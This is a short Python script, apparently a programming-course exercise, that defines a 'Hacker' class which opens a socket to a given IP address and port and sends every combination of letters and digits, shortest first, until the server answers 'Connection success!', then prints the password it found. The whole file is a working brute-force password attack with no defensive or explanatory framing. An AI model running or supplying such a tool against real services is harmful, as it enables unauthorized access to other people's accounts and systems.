import argparse
from itertools import product
import socket
from string import ascii_lowercase, ascii_uppercase, digits
import sys


class Hacker:
    def __init__(self) -> None:
        self.parser = argparse.ArgumentParser(description="Hacking password")
        self.parser.add_argument("ip", type=str, help="IP address of resource")
        self.parser.add_argument("port", type=int, help="Port of IP address")
        # self.parser.add_argument("password", type=str, help="Password of resource")
        self.ip_address, self.port, self.password = "", 0, ""
        self.buffer = 1024
        self.symbols = ascii_lowercase + ascii_uppercase + digits

    def parse(self) -> None:
        if len(sys.argv) < 3:
            print("Not enough arguments")
            sys.exit(1)
        args = self.parser.parse_args()
        self.ip_address = args.ip
        self.port = args.port
        # self.password = args.password

    def connect_brute_force(self) -> None:
        with socket.socket() as client_socket:
            hostname = self.ip_address
            port = self.port
            address = (hostname, port)

            client_socket.connect(address)
            response = ""
            generator = self.generator()
            while response != "Connection success!":
                self.password = "".join(next(generator))
                data = self.password
                data = data.encode()

                client_socket.send(data)

                response = client_socket.recv(self.buffer)

                response = response.decode()
            print(self.password)
            print(response)
            
    def generator(self) -> str:
        for length in range(1, len(self.symbols) + 1):
            for combination in product(self.symbols, repeat=length):
                yield ''.join(combination)


def main():
    hacker = Hacker()
    hacker.parse()
    hacker.connect_brute_force()


if __name__ == "__main__":
    main()
